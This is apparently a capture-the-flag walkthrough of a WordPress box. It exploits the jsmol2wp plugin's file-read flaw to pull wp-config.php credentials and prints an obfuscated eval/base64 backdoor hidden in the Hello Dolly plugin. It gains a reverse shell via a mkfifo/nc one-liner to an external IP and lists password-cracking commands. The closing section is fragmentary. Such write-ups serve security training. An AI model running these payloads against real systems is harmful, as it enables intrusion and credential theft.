Searching for vulnerabilities in the `jsmol2wp` plugin leads to a [file read vulnerability](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt).

## Shell as www-data

I exploit the file read vulnerability to access the WordPress configuration file (wp-config.php):
```console
$ curl http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
[...]
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', '<REDACTED>' );
define( 'DB_HOST', 'localhost' );
[...]
```
Using the credentials `wpuser:<REDACTED>`, I log into the WordPress dashboard at http://www.smol.thm/wp-admin/. In the dashboard, I find a page called `Webmaster Tasks!!` with the following security notes:
```
1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
2- Set Up HTTPS: Configure an SSL certificate to enable HTTPS and encrypt data transmission.
3- Update Software: Regularly update your CMS, plugins, and themes to patch vulnerabilities.
4- Strong Passwords: Enforce strong passwords for users and administrators.
5- Input Validation: Validate and sanitize user inputs to prevent attacks like SQL injection and XSS.
6- [IMPORTANT] Firewall Installation: Install a web application firewall (WAF) to filter incoming traffic.
7- Backup Strategy: Set up regular backups of your website and databases.
8- [IMPORTANT] User Permissions: Assign minimum necessary permissions to users based on roles.
9- Content Security Policy: Implement a CSP to control resource loading and prevent malicious scripts.
10- Secure File Uploads: Validate file types, use secure upload directories, and restrict execution permissions.
11- Regular Security Audits: Conduct routine security assessments, vulnerability scans, and penetration tests.
```
Since `wpuser` lacks plugin access, I exploit the file read vulnerability again to inspect the "Hello Dolly" plugin's source code:
```console
$ curl http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
[...]
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
[...]
```
The code contains a base64-encoded payload. Decoding it reveals the following backdoor:
```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }  
```
The parameter `cmd` allows arbitrary command execution. To verify this, I run: `http://www.smol.thm/wp-admin/?cmd=id`

Finally, I gain a reverse shell:
```
http://www.smol.thm/wp-admin/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|bash%20-i%202%3E%261|nc%2010.x.x.x%209001%20%3E%2Ftmp%2Ff
```

$ hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --user

## Shell as xavi

```console

$ john -w=/usr/share/wordlists/rockyou.txt hash_zip.txt

I unzip the file. Inside, I find an old `wp-config.php` file. Examining its contents, I discover the credentials `xavi:<REDACTED>`. Using these, I switch to the user `xavi`:

```
